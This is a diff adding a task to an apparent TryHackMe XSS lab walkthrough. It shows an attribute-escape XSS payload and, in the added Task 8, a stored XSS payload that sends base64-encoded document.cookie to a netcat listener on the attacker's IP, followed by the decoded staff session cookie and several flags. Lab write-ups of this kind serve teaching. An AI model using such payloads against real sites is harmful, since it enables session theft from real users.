@@ -40,3 +40,12 @@
 1. In the challenge our input is inside double quotes in the `src` attribute of image tag.
 2. So we need to escape `src` attribute and create an event handler inside image tag to execute JS, like so: `x" onerror="alert('THM')"`.
 3. Submit for flag: `THM{XSS_MASTER}`.
+
+### Task 8:
+#### What is the value of the staff-session cookie?
+1. This task is only possible through attack box.
+2. In the attack box run the command `nc -lvnp 8000`.
+3. In the application, sign-up and create a ticket with the payload `</textarea><script>fetch('http://<THM-VPN-IP>:8000/?cookies=' + btoa(document.cookie));</script>` inside `Ticket Contents`.
+4. In the attack box we will receive a request with a base64 encoded value in `cookies` param, copy that.
+5. Run the command: `echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d` for the decoded staff cookie.
+6. Answer: `4AB305E55955197693F01D6F8FD2D321`.
